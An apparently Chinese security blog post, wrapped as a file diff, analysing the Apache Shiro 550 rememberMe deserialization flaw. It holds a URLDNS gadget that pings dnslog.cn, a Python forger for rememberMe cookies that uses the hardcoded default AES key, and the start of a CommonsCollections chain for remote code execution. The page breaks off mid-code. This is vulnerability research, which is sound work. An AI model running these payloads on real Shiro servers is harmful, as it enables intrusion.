@@ -1,0 +1,755 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>Shiro框架550反序列化漏洞分析 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Shiro框架550反序列化漏洞分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Java/" style="color: #03a9f4">
+                    Java
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Apache <em>Shiro是</em>一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
+<span id="more"></span>
+
+<h1 id="shiro550环境下载"><a href="#shiro550环境下载" class="headerlink" title="shiro550环境下载"></a>shiro550环境下载</h1><p><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4</a></p>
+<p>idea打开后增加</p>
+<p>samples\pom.xml</p>
+<pre><code>&lt;properties&gt;
+    &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;
+    &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;
+&lt;/properties&gt;
+</code></pre>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140831354.png" alt="image-1709140831354"></p>
+<p>samples\web\pom.xml</p>
+<p>71行版本改为1.2 ， 77，93行注释掉</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140841778.png" alt="image-1709140841778"></p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140847835.png" alt="image-1709140847835"></p>
+<p>配置tomcat</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140854441.png" alt="image-1709140854441"></p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140858666.png" alt="image-1709140858666"></p>
+<p>启动</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140864747.png" alt="image-1709140864747"></p>
+<h1 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h1><p>从<code>AbstractRememberMeManager.onSuccessfulLogin</code>下断点开始分析，web页面使用root:secret登录，一定要勾选Remember<br>Me</p>
+<p>这里判断cookie里面是否有RememberMe，存在的话调用rememberIdentity()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140872004.png" alt="image-1709140872004"></p>
+<p>跟进rememberIdentity()方法，发现调用了getIdentityToRemember()和rememberIdentity()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140877815.png" alt="image-1709140877815"></p>
+<p>跟进getIdentityToRemember()方法，发现返回了用户名，赋值给了principals</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140883191.png" alt="image-1709140883191"></p>
+<p>回到rememberIdentity()方法，再跟进rememberIdentity()方法，调用了convertPrincipalsToBytes()方法和rememberSerializedIdentity()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140889082.png" alt="image-1709140889082"></p>
+<p>跟进convertPrincipalsToBytes()，他对用户名进行了序列化，然后调用了getCipherService()和encrypt()</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140895311.png" alt="image-1709140895311"></p>
+<p>跟进getCipherService()看看，返回了加密方式</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140902985.png" alt="image-1709140902985"></p>
+<p>回到convertPrincipalsToBytes()，进入encrypt()看看</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140910395.png" alt="image-1709140910395"></p>
+<p>这里跟上面一样，使用getCipherService()获取了加密方式，然后使用cipherService.encrypt()进行加密</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140919456.png" alt="image-1709140919456"></p>
+<p>跟一下密钥getEncryptionCipherKey()</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140926224.png" alt="image-1709140926224"></p>
+<p>继续跟</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140935976.png" alt="image-1709140935976"></p>
+<p>继续</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140940945.png" alt="image-1709140940945"></p>
+<p>跟进</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140946095.png" alt="image-1709140946095"></p>
+<p>跟一下<em>DEFAULT_CIPHER_KEY_BYTES</em>，发现了密钥</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140951887.png" alt="image-1709140951887"></p>
+<p>回到rememberIdentity()方法，bytes现在存储的是经过aes加密的序列化字节</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140957608.png" alt="image-1709140957608"></p>
+<p>跟进rememberSerializedIdentity()，对加密后的值进行了编码并写入到cookie的rememberme字段</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140963834.png" alt="image-1709140963834"></p>
+<p>序列化---&gt;AES加密---&gt;base64编码---&gt;设置到 cookie 中的<br>rememberme 字段</p>
+<h1 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h1><p>从org&#x2F;apache&#x2F;shiro&#x2F;mgt&#x2F;DefaultSecurityManager.java#getRememberedIdentity()开始分析</p>
+<p>跟进getRememberedPrincipals()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140972257.png" alt="image-1709140972257"></p>
+<p>分别调用了getRememberedSerializedIdentity()和convertBytesToPrincipals()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140977320.png" alt="image-1709140977320"></p>
+<p>先去getRememberedSerializedIdentity()方法看看，从cookie获取了rememberme值进行了base64解密</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140983647.png" alt="image-1709140983647"></p>
+<p>convertBytesToPrincipals()方法，调用了getCipherService()和()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140988936.png" alt="image-1709140988936"></p>
+<p>decrypt()方法进行了解密</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709140994475.png" alt="image-1709140994475"></p>
+<p>回到convertBytesToPrincipals()方法，跟进deserialize()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141000077.png" alt="image-1709141000077"></p>
+<p>继续跟进到getSerializer().deserialize方法，反序列化了字节数组</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141004388.png" alt="image-1709141004388"></p>
+<p>读取 cookie 中的 rememberMe---&gt;base64 解码---&gt;AES<br>解密---&gt;反序列化</p>
+<h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>URLDNS是ysoserial里面的一条链，一般用于检测是否存在java反序列化漏洞</p>
+<p>漏洞原理：</p>
+<p>HashMap实现了Serializable接口，重写了readObject,<br>在反序列化时会调用hash函数计算key的hashCode，而URL的hashCode在计算时会调用getHostAddress来解析域名,<br>从而触发DNS查询。</p>
+<p>ysoserial的利用链</p>
+<ul>
+<li><p>Gadget Chain:</p>
+<ul>
+<li><p>HashMap.readObject()</p>
+<ul>
+<li><p>HashMap.putVal()</p>
+<ul>
+<li><p>HashMap.hash()</p>
+<ul>
+<li>URL.hashCode()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>从上往下跟，先进入HashMap.readObject()，它重写了readObject方法。</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141015566.png" alt="image-1709141015566"></p>
+<p>最终它使用了putVal()方法，并且会调用hash()方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141022669.png" alt="image-1709141022669"></p>
+<p>跟进hash方法()，如果key不等于null，就会调用key.hashCode方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141027905.png" alt="image-1709141027905"></p>
+<p>跟进hashCode()方法，由于在ysoserial中的URLDNS是利用URL对象，那么就要跟进URL类中的hashCode()方法</p>
+<p>进入到URL类，发现URL类实现了serlazerb，可以被序列化</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141033805.png" alt="image-1709141033805"></p>
+<p>跟进到URL#hashCode，在hashCode等于-1的时候会调用handler.hashCode，</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141041878.png" alt="image-1709141041878"></p>
+<p>跟进hashCode发现默认值为-1</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141046927.png" alt="image-1709141046927"></p>
+<p>回到hashCode方法，看看handler.hashCode()是什么，发现它调用了getHostAddress方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141053786.png" alt="image-1709141053786"></p>
+<p>跟进getHostAddress方法，里面调用了InetAddress.<em>getByName</em>(host)，会进行解析主机名，进而产生DNS记录。</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141059880.png" alt="image-1709141059880"></p>
+<p>发现HashMap的put方法同样使用了hash方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141065388.png" alt="image-1709141065388"></p>
+<p>跟进去发现是跟上面一样的hash，也就是说只要给HashMap的put方法的第一个参数传递一个URL，就能调用到URL类的hashCode方法进行发起一次DNS查询</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141070687.png" alt="image-1709141070687"></p>
+<p>构造代码测试</p>
+<pre><code class="java">import java.io.IOException;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS &#123;
+    public static void main(String[] args) throws IOException &#123;
+        HashMap&lt;URL,Integer&gt; hashMap =  new HashMap&lt;URL,Integer&gt;();
+        URL url = new URL(&quot;http://dnslog.cn&quot;);
+        hashMap.put(url,2);
+    &#125;
+&#125;
+</code></pre>
+<p>DNSLOG收到请求</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141077913.png" alt="image-1709141077913"></p>
+<p>我们把HashMap序列化，再次反序列化看看会不会触发DNS查询</p>
+<pre><code class="java">import java.io.*;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS &#123;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+
+    &#125;
+
+    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj =  ois.readObject();
+        return obj;
+    &#125;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        HashMap&lt;URL,Integer&gt; hashMap =  new HashMap&lt;URL,Integer&gt;();
+        URL url = new URL(&quot;http://dnslog.cn&quot;);
+        hashMap.put(url,2);
+        serialize(hashMap);
+        unserialize(&quot;ser.bin&quot;);
+    &#125;
+
+&#125;
+</code></pre>
+<p>由于hashCode默认为-1，在序列化时候会进行一次dns查询，现在要让它仅在反序列化时候再进行DNS查询</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141085964.png" alt="image-1709141085964"></p>
+<p>使用java反射修改hashCode默认值，在序列化时候赋值非-1的int类型，这样在序列化时候就不会触发DNS查询</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141092508.png" alt="image-1709141092508"></p>
+<p>在反序列化时候，hashCode还是-1，最终触发DNS查询</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141097891.png" alt="image-1709141097891"></p>
+<p>最终代码</p>
+<pre><code class="java">import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS &#123;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+
+    &#125;
+
+    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj =  ois.readObject();
+        return obj;
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        HashMap&lt;URL,Integer&gt; hashMap =  new HashMap&lt;URL,Integer&gt;();
+        URL url = new URL(&quot;http://y8wpv0.dnslog.cn&quot;);
+        Class c = url.getClass();
+        Field field = c.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(url,1);
+        hashMap.put(url,2);
+        field.set(url,-1);
+        serialize(hashMap);
+//        unserialize(&quot;ser.bin&quot;);
+    &#125;
+
+
+&#125;
+</code></pre>
+<p>使用python脚本将序列化的数据进行加密并编码带入到cookie</p>
+<pre><code class="python">import uuid
+import base64
+from Crypto.Cipher import AES
+def get_file_data(filename):
+    with open(filename,&#39;rb&#39;) as f:
+        return f.read()
+
+def encode_rememberme():
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(get_file_data(&quot;ser.bin&quot;))
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == &#39;__main__&#39;:
+    payload = encode_rememberme()
+    print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))
+</code></pre>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141150355.png" alt="image-1709141150355"></p>
+<p>生成后带入cookie发过去就可以看到DNS请求</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141160512.png" alt="image-1709141160512"></p>
+<p>URLDNS调用链</p>
+<pre><code class="java">HashMap.readObject() -&gt;  HashMap.putVal() -&gt; HashMap.hash()  -&gt; URL.hashCode().handler.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt; URLStreamHandler.getHostAddress().InetAddress.getByName()
+</code></pre>
+<h1 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h1><p>URLDNS链多用于探测漏洞是否存在，最终我们还需要执行代码</p>
+<p>pom添加上CC依赖</p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.2.1&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141168839.png" alt="image-1709141168839"></p>
+<p>使用CC链打一下发现报错了，尝试加载CC的Transformer类，但是没有找到</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141174520.png" alt="image-1709141174520"></p>
+<p>想办法构造一条不使用Transformer的利用链</p>
+<p>定位到java.util.HashMap#readObject</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141180188.png" alt="image-1709141180188"></p>
+<p>调用了hash方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141188244.png" alt="image-1709141188244"></p>
+<p>hash调用了hashcode，由于key可控，传递为TiedMapEntry可调用到TiedMapEntry.hashCode</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141223850.png" alt="image-1709141223850"></p>
+<p>发现调用了getValue方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141230196.png" alt="image-1709141230196"></p>
+<p>又调用了get方法</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141237105.png" alt="image-1709141237105"></p>
+<p>并且map参数可控</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141242324.png" alt="image-1709141242324"></p>
+<p>如果map为LazyMap，会调用到LazyMap#get，并且发现get调用了transform</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141247845.png" alt="image-1709141247845"></p>
+<p>并且factory值可控</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141254226.png" alt="image-1709141254226"></p>
+<p>如果赋值为InvokerTransfomer，则会调用InvokerTransfomer.transform(key)</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141259354.png" alt="image-1709141259354"></p>
+<p>使用InvokerTransformer.transform调用newTransformer()方法，input要在最前面(TiedMapEntry)要传递TemplatesImpl类</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141263880.png" alt="image-1709141263880"></p>
+<p>后面就是CC3的代码了，利用了类的动态加载机制,一共用到了CC6和CC2以及CC3，直接复制过来代码拼接起来</p>
+<p>完整代码</p>
+<pre><code>package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class shiro_CC6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        //CC3
+        TemplatesImpl templates = new TemplatesImpl();
+        Class c = templates.getClass();
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates, &quot;a&quot;);
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+        byte[][] bytecodes = &#123;bytecode&#125;;
+        bytecodesField.set(templates, bytecodes);
+
+        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates, new TransformerFactoryImpl());
+        //CC2
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
+
+        //CC6
+        Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
+
